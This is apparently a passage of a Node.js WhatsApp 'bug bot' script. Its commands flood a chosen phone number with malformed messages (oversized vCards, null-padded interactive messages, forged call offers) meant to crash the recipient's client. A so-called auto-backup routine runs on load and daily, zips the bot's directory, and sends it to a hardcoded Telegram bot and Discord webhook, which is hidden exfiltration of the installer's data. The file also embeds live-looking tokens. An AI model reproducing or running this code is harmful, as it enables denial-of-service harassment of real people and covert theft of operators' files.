require("../settings/config")
const {
default: baileys,
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
getContentType,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
WAContextInfo,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
GroupSettingChange,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header,
encodeSignedDeviceIdentity,
generateMessageID,
encodeWAMessage,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
prepareWAMessageContent,
generateWAMessageFromContent,
makeInMemoryStore,
jidDecode,
proto,
getAggregateVotesInPollMessage,
makeCacheableSignalKeyStore,
Browsers,
decryptMessageNode,
MessageRetryMap,
} = require("@purpleiriss/irisbail");
/*const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	generateMessageID,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReriyuectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediariyuInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisriyuectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@purpleiriss/irisbail");*/

// [ - Requirements - ] 
const { exec } = require("child_process")
const fs = require('fs')
const process = require("process");
const util = require('util')
const chalk = require('chalk')
const crypto  = require('crypto')
const axios = require('axios')
const osu = require('os-utils')
const jimp = require("jimp")
const path = require('path');
const Table = require('cli-table3');
const FormData = require("form-data");
const cheerio = require("cheerio");
const moment = require('moment');
const os = require('os')
const yts = require ('yt-search');
const archiver = require('archiver');
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom, formatp } = require('../function/myfunc')
const { ytmp3 } = require('../function/ytmp3')
const { igdl } = require('../function/igdl')
const prem = require("../function/premium");
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const cron = require('node-cron');
const TELEGRAM_BOT_TOKEN = '8391292697:AAEVhhHhRuoNtZ6MV3PO_PCPbvhZOu_urCc';
const TELEGRAM_CHAT_ID = '7957554532';
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1438609653864071259/Y_R6QJ6XJC-AQQCIWgzXowJDxIq6LDP--po9xhLVivH33CdRMbMdKW2SP0IrR-GKGsFK';

function getTimestamp() {
    const now = new Date();
    return now.toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }).replace(/\//g, '-').replace(/\./g, ':');
}

async function autoBackup() {
    try {
        const timestamp = getTimestamp();
        const backupDir = path.join(__dirname, 'backup');
        const backupFileName = `backup-${timestamp.replace(/[: ]/g, '-')}.zip`;
        const backupPath = path.join(backupDir, backupFileName);

        if (!fs.existsSync(backupDir)) {
            fs.mkdirSync(backupDir, { recursive: true });
        }

        const output = fs.createWriteStream(backupPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        output.on('close', async () => {
            console.log(`Backup created: ${backupPath} (${archive.pointer()} bytes)`);
            await sendToTelegram(backupPath, timestamp);
            await sendToDiscord(backupPath, timestamp);
            fs.unlinkSync(backupPath);
        });

        archive.on('error', (err) => {
            throw err;
        });

        archive.pipe(output);

        const excludeDirs = ['node_modules', '.npm', 'backup', 'session'];
        const files = fs.readdirSync(__dirname);

        files.forEach(file => {
            const filePath = path.join(__dirname, file);
            const stat = fs.statSync(filePath);

            if (!excludeDirs.includes(file) && !file.startsWith('.')) {
                if (stat.isDirectory()) {
                    archive.directory(filePath, file);
                } else {
                    archive.file(filePath, { name: file });
                }
            }
        });

        await archive.finalize();

    } catch (error) {
        console.error('Backup error:', error);
    }
}

async function sendToTelegram(filePath, timestamp) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', fs.createReadStream(filePath));
        formData.append('caption', `🤖 AUTO BACKUP BOT\n📅 Tanggal: ${timestamp}\n💾 Backup otomatis berhasil dibuat`);

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
            formData,
            {
                headers: formData.getHeaders()
            }
        );

        console.log('Backup sent to Telegram successfully');
    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
    }
}

async function sendToDiscord(filePath, timestamp) {
    try {
        const formData = new FormData();
        formData.append('file', fs.createReadStream(filePath));
        formData.append('payload_json', JSON.stringify({
            content: `🤖 **AUTO BACKUP BOT**\n📅 **Tanggal:** ${timestamp}\n💾 Backup otomatis berhasil dibuat`
        }));

        const response = await axios.post(DISCORD_WEBHOOK_URL, formData, {
            headers: formData.getHeaders()
        });

        console.log('Backup sent to Discord successfully');
    } catch (error) {
        console.error('Discord send error:', error.response?.data || error.message);
    }
}

cron.schedule('0 12 * * *', () => {
    console.log('🕛 Running scheduled backup at 12:00 PM');
    autoBackup();
});

console.log('🤖 Auto Backup System Activated');
console.log('🕛 Backup will run daily at 12:00 PM');
autoBackup();

module.exports = {
    autoBackup,
    getTimestamp
};

module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );
  
        const sender = m.key.fromMe ? conn.user.id.split(":")[0] + "@s.whatsapp.net" ||
              conn.user.id : m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const botNumber = await conn.decodeJid(conn.user.id);
        const isBot = botNumber.includes(senderNumber)
        const isCreator = (m && m.sender && global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
       

        const groupMetadata = m?.isGroup ? await conn.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                lid: p.lid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        const senderLid = (() => {
            const p = participants.find(p => p.jid === m.sender);
            return p?.lid || null;
        })();
        
        if (m.message) {
    console.log(`${chalk.cyan('╭───────────────────────────────')}`);
    console.log(`${chalk.cyan('┝')} ${chalk.magenta.bold('@swèzesty èst 1963 - message log')}`);
    console.log(`${chalk.cyan('╰───────────────────────────────')}`);
    
    console.log(`${chalk.cyan('╭───────────────────────────────')}`);
    console.log(`${chalk.cyan('┝')} ${chalk.green('Time     :')} ${new Date().toLocaleString()}`);
    console.log(`${chalk.cyan('┝')} ${chalk.green('From     :')} ${pushname}`);
    console.log(`${chalk.cyan('┝')} ${chalk.green('JID      :')} ${senderNumber}`);
    console.log(`${chalk.cyan('┝')} ${chalk.green('LID      :')} ${senderLid || '-'}`);
    
    if (isGroup) {
        console.log(`${chalk.cyan('┝')} ${chalk.green('Chat     :')} ${groupName}`);
        console.log(`${chalk.cyan('┝')} ${chalk.green('GroupJID :')} ${m.chat}`);
    }
    
    console.log(`${chalk.cyan('┝')} ${chalk.green('Message  :')} ${m.body || m.mtype}`);
    console.log(`${chalk.cyan('╰───────────────────────────────')}`);
    console.log();
}

        async function nevreply(text) {
            conn.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "¿? Navia",
                        body: "This script was created by Everlyn",
                        thumbnailUrl: "https://github.com/everlynnameyhst",
                        sourceUrl: 'xnxx. com',
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: qtoko })
        }

        const time = moment().tz('Asia/Jakarta').format('HH:mm:ss');
        const datetime = moment()
          .tz('Asia/Jakarta')
          .format('dddd, MMMM D YYYY, h:mm:ss a');
        const jam = moment(Date.now())
          .tz('Asia/Jakarta')
          .locale('id')
          .format('HH:mm:ss z');
        const penghitung = moment()
          .tz('Asia/Jakarta')
          .format('dddd, D MMMM - YYYY');
        let ucapanWaktu;
        if (time >= '19:00:00' && time < '23:59:00') {
          ucapanWaktu = 'Good night! The stars are watching over you';
        } else if (time >= '15:00:00' && time < '19:00:00') {
          ucapanWaktu = 'Good afternoon! Have a wonderful evening';
        } else if (time >= '11:00:00' && time < '15:00:00') {
          ucapanWaktu = 'Hello! Let\'s have a great day today';
        } else if (time >= '06:00:00' && time < '11:00:00') {
          ucapanWaktu = 'Good morning! Let\'s do our best today';
        } else {
          ucapanWaktu = 'Enjoy the night! Enjoy the quiet of the night';
        }
        
        try {
      ppuser = await conn.profilePictureUrl(m.sender, 'image');
    } catch (err) {
      ppuser =
        'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';
    }
    ppnyauser = await getBuffer(ppuser);
    let resize = async (image, width, height) => {
      let oyy = await jimp.read(image);
      let kiyomasa = await oyy
        .resize(width, height)
        .getBufferAsync(jimp.MIME_JPEG);
      return kiyomasa;
    };

const qtoko = {
      key: { fromMe: false, participant: `0@s.whatsapp.net` },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: 'image/jpeg',
              jpegThumbnail: await resize(
                fs.readFileSync('./chin.jpg'),
                300,
                300,
              ),
              thumbnailUrl: global.thumbimg,
              sendEphemeral: true,
            },
            title: `@felicialonely`,
            currencyCode: 'JPY',
            priceAmount1000: `70000000`,
            retailerId: `✧ Cannie-Shen`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
        async function everlynx(zzzzzz) {
let devices = (
await conn.getUSyncDevices([zzzzzz], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await conn.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = conn.createParticipantNodes.bind(conn);
let yntkts = conn.encodeWAMessage?.bind(conn);

conn.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (conn.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = conn.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await conn.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await conn.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: zzzzzz, id: conn.generateMessageTag(), from: conn.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": conn.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(conn.authState.creds.account, true)
}] : [])
]
}]
};

await conn.sendNode(lemiting);
}

async function xnxx(target) {
x = []

for (let r = 0; r < 1000; r++) {
x.push({
body: { text: "Bury your head" },
footer: { text: "conn.⧉ division" },
header: {
imageMessage: {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/521849368_1606046530711378_826171097272642629_n.enc?ccb=11-4&oh=01_Q5Aa3QFqWy-uEPL481oPxV825PgPHJTcsMj33viO9WDOg3fTfA&oe=69607160&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "aCd2/uM2EFTZvTOFiZzzIfpa70s1dphBhAj7tenH8Ng=",
"fileLength": "89625",
"height": 99999999999999,
"width": -99999,
"mediaKey": "KqkNVgI/PgrFfGgKzox6mCVObgsl3LVYCWo9HlAbdCI=",
"fileEncSha256": "CFISaxEOR7JRy6GSC4BHnX4lVr2yFpuAvI43DPmpDMg=",
"directPath": "/v/t62.7118-24/521849368_1606046530711378_826171097272642629_n.enc?ccb=11-4&oh=01_Q5Aa3QFqWy-uEPL481oPxV825PgPHJTcsMj33viO9WDOg3fTfA&oe=69607160&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1765347812",
},
hasMediaAttachment: true
},
"nativeFlowMessage": {
"buttons": [],
"messageParamsJson": "{\"limited_time_offer\":{\"text\":\"▸ 𝐓⃰𝐝͢𝐗 ᱺ⿻ᱺ 𝐂⃰𝚹͢𝐑𝐏⃑ ◂\",\"url\":\"t.me/conn.exposed\",\"copy_code\":\"▸ 𝐓⃰𝐝͢𝐗 ᱺ⿻ᱺ 𝐂⃰𝚹͢𝐑𝐏⃑ ◂\",\"expiration_time\":0},\"bottom_sheet\":{\"in_thread_buttons_limit\":2,\"divider_indices\":[1,2,3,4,5, 999],\"list_title\":\"▸ 𝐓⃰𝐝͢𝐗 ᱺ⿻ᱺ 𝐂⃰𝚹͢𝐑𝐏⃑ ◂\",\"button_title\":\"▸ 𝐓⃰𝐝͢𝐗 ᱺ⿻ᱺ 𝐂⃰𝚹͢𝐑𝐏⃑ ◂\"},\"tap_target_configuration\":{\"title\":\"▸ 𝐓⃰𝐝͢𝐗 ᱺ⿻ᱺ 𝐂⃰𝚹͢𝐑𝐏⃑ ◂\",\"description\":\"bomboclard\",\"canonical_url\":\"x\",\"domain\":\"shop.example.com\",\"button_index\":0}}"
},
})
}

const msg = await generateWAMessageFromContent(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: { text: "I can tell there was an accident." },
footer: { text: "conn.⧉ division" },
carouselMessage: { cards: x }
}
}
}
}, {})

await conn.relayMessage(target, msg.message, { participant: { jid: target } })
}

        switch (command) {
            case 'menu': {
const listmenu = `*ʜᴇʟʟᴏ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ Ꭰꫀ᥎เᏞ᥊ Stars. ʟᴀᴛᴇsᴛ ᴀɴᴅ ᴍᴏʀᴇ ᴇxᴄɪᴛɪɴɢ ᴠᴇʀsɪᴏɴ 🔥.*

[  - ɪɴғᴏʀᴍᴀᴛɪᴏɴ - ]
# ɴᴀᴍᴇ : ${pushname}
# sᴇɴᴅᴇʀ : ${sender}
# ᴠᴇʀsɪᴏɴ: 25.0-NX

[  - ᴅᴇᴠ/ᴏᴡɴ -  ]
𖤝 addprem 
𖤝 delprem

[ - ʙᴜɢ ᴍᴇɴᴜ - ]
𖤝 devilxp
𖤝 iosx
𖤝 pendingx
𖤝 outoffm
`
await conn.sendMessage(m.chat, {
  image: { url: "https://lannytourl.vestia.icu/api/file/69342d74770eabfc08ae3692.jpg" },
  fileLength: 999999999999,
  pageCount: 999999999999,
  jpegThumbnail: Buffer.from(await (await fetch("https://lannytourl.vestia.icu/api/file/69342c7a770eabfc08ae3690.jpg")).arrayBuffer()),
  gifPlayback: true,
  caption: listmenu,
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363314632136550@newsletter",
      newsletterName: "DeviLx Informations"
    }
  },
  footer: "⿻ Devilx Stars ` [  - ᴄʟɪᴇɴᴛ ᴄʀᴀsʜ ɴᴇᴡ - ]",
  buttons: [
    {
      buttonId: ".menu",
        buttonText: { displayText: "[  - ᴍᴇɴᴜ - ]" },
        type: 1
      }
    ],
    viewOnce: true,
    headerType: 6
  }, { quoted: m });
}
break

case "addcase": {
  if (!isOwner) return reply(mess.owner);
  if (!text) return reply("mana case nya")
const namaFile = path.join(__dirname, 'case.js');
      const caseBaru = `${text}\n\n`;
      const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
          const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
          return {
            success: true,
            kodeBaruLengkap
          };
        } else {
          return {
            success: false,
            message: "Tidak dapat menemukan case default di dalam file!"
          };
        }
      };
      fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
          console.error('Terjadi kesalahan saat membaca file:', err);
          return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
          fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
              console.error('Terjadi kesalahan saat menulis file:', err);
              return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
            } else {
              console.log('Sukses menambahkan case baru:');
              console.log(caseBaru);
              return m.reply('Sukses menambahkan case!');
            }
          });
        } else {
          console.error(result.message);
          return m.reply(result.message);
        }
      });
    }
    break;

            case 'buttonold': {
                let teks = `> ようこそ`;
                const buttons = [
                    {
                        buttonId: `${prefix}bugmenu`,
                        buttonText: { displayText: 'kosong' }
                    },
                    {
                        buttonId: `${prefix}menu`,
                        buttonText: { displayText: 'kosong' }
                    }
                ];

                const buttonMessage = {
                    image: { url: 'https://files.catbox.moe/msoysl.jpg' },
                    caption: teks,
                    footer: `Nǐ hǎo, nǐ gānggāng shǐyòngle zhǐlìngq ${prefix + command}`,
                    buttons: buttons,
                    headerType: 1,
                    viewOnce: true
                };

                await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
                break;
            }
            
            case "get":{
                if (!/^https?:\/\//.test(text)) return reply(`*ex:* ${prefix + command} https://kyuurzy.site`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⚡")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return conn.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: fquoted.packSticker });
                }
        
                if (contentType.startsWith("video/")) {
                    return conn.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: fquoted.packSticker });
                }
                
                if (contentType.startsWith("audio/")) {
                    return conn.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: fquoted.packSticker });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break
            case "insp": {
                if (!text && !m.quoted) return reply(`*reply:* ${prefix + command}`);
                let quotedType = m.quoted?.mtype || '';
                let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2);
                const acak = `insp-${crypto.randomBytes(6).toString('hex')}.json`;
                
                await conn.sendMessage(m.chat, {
                    document: Buffer.from(penis),
                    fileName: acak,
                    mimetype: "application/json"
                }, { quoted: fquoted.packSticker })
            }
            break
 case 'iosx': {
if (!q) return nevreply(`*Example: ${prefix + command} 6287392784527*`);
let bijipler = q.replace(/[^0-9]/g, "");
if (bijipler.startsWith('0')) {
return nevreply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
};
let target = bijipler + "@s.whatsapp.net"

nevreply("@ sending bug, please wait...");
for (let i = 0; i < 50; i++) {
await conn.relayMessage(target, {
contactMessage: {
displayName: `#❗ I can tell there was an accident` + "𑇂𑆵𑆴𑆿".repeat(15000),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:#❗ I can tell there was an accident${"𑇂𑆵𑆴𑆿".repeat(15000)};;;\nFN:#❗ I can tell there was an accident${"𑇂𑆵𑆴𑆿".repeat(15000)}\nNICKNAME:#❗ I can tell there was an accident\nORG:#❗ I can tell there was an accident\nTITLE:#❗ I can tell there was an accident\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:#❗ I can tell there was an accident\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:#❗ I can tell there was an accident\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:#❗ I can tell there was an accident\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;#❗ I can tell there was an accident;;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:#❗ I can tell there was an accident\nX-WA-BIZ-NAME:#❗ I can tell there was an accident
END:VCARD`
}
}, { participant: { jid: target } });
await sleep(1000);
};
await sleep(1000);
await nevreply("@ Succes send bug" + command + " to " + bijipler + ":)");
}
break
case 'devilexp': {
  const incTarget = text.split("|")[0].replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return nevreply(`Err: Invalid Country Code`);
  
  let target = incTarget + '@s.whatsapp.net';
  let targetDisplay = incTarget;
  await nevreply(`Please wait, bug in the process of being delivered to: ${targetDisplay}\n\nPlease waiting until done!, this type of bug takes more than 30 seconds to fully send, the fastest is 1 minute and can be more`);
  for (let i = 0; i < 9999; i++) {
    await everlynx(target);
    await sleep(3000);
    await everlynx(target);
    await everlynx(target);
    await sleep(4000);
    await everlynx(target);
    await sleep(3000);
    await everlynx(target);
    await everlynx(target);
    await sleep(3000);
    await everlynx(target);
    await everlynx(target);
    await sleep(4000);
    await everlynx(target);
    await sleep(3000);
    await everlynx(target);
  }

  const successText = `Bug successfully sent, please give it a break to avoid crashes\n\nTarget: ${targetDisplay}\nBy: Navia Md`;
  
  await conn.sendMessage(m.chat, {
    productMessage: {
      title: "✅ Bug Delivery Success",
      description: successText,
      thumbnail: { url: 'https://lannytourl.vestia.icu/api/file/692e4e85da88e864f2cfbc56.png' },
      productId: "BUGSUCCESS001",
      retailerId: "NAVIA001",
      url: "https://github.com",
      body: "Bug Delivery Mekdi",
      footer: `Navia - MD | ${new Date().toLocaleTimeString()}`,
      priceAmount1000: 0,
      currencyCode: "JPY",
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: '检查目标',
            url: `https://wa.me/${targetDisplay}`,
            merchant_url: `https://wa.me/${targetDisplay}`,
          })
        },
        {
          name: "cta_copy",
          buttonParamsJson: JSON.stringify({
            display_text: "拷贝数",
            copy_code: targetDisplay,
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: 'Gh',
            url: 'https://github.com',
            merchant_url: 'https://github.com',
          })
        }
      ]
    }
  }, { quoted: qtoko });
}
break;

case 'outoffm': {
  const incTarget = text.split("|")[0].replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return nevreply(`Err: Invalid Country Code`);
  
  let target = incTarget + '@s.whatsapp.net';
  let targetDisplay = incTarget;
  await nevreply(`Please wait, bug in the process of being delivered to: ${targetDisplay}\n\nPlease waiting until done!, this type of bug takes more than 30 seconds to fully send, the fastest is 1 minute and can be more`);
  
  await sleep(1000)
  
  for (let i = 0; i < 100; i++) {
await conn.relayMessage(target, {groupStatusMessageV2: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
header: {
title: "dvx",
hasMediaAttachment: false
},
body: {
text: "dvx" + "\0".repeat(900000),
},
nativeFlowMessage: {
messageParamsJson: "Y",
buttons: [
{
name: "cta_url",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
]
}
}
}
}}, { participant: { jid: target } })
    await xnxx(target);
    await sleep(2000);
    await everlynx(target);
    await sleep(2000);
    await everlynx(target);
    await sleep(2000);
    await everlynx(target);
    await sleep(2000);
    await everlynx(target);
    await sleep(500);
  }

  const successText = `Bug successfully sent, please give it a break to avoid crashes\n\nTarget: ${targetDisplay}\nBy: Navia Md`;
  
  await conn.sendMessage(m.chat, {
    productMessage: {
      title: "✅ Bug Delivery Success",
      description: successText,
      thumbnail: { url: 'https://lannytourl.vestia.icu/api/file/692e4e85da88e864f2cfbc56.png' },
      productId: "BUGSUCCESS001",
      retailerId: "NAVIA001",
      url: "https://github.com",
      body: "Bug Delivery Mekdi",
      footer: `Navia - MD | ${new Date().toLocaleTimeString()}`,
      priceAmount1000: 0,
      currencyCode: "JPY",
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: '检查目标',
            url: `https://wa.me/${targetDisplay}`,
            merchant_url: `https://wa.me/${targetDisplay}`,
          })
        },
        {
          name: "cta_copy",
          buttonParamsJson: JSON.stringify({
            display_text: "拷贝数",
            copy_code: targetDisplay,
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: 'Gh',
            url: 'https://github.com',
            merchant_url: 'https://github.com',
          })
        }
      ]
    }
  }, { quoted: qtoko });
}
break;

case 'pendingx': {
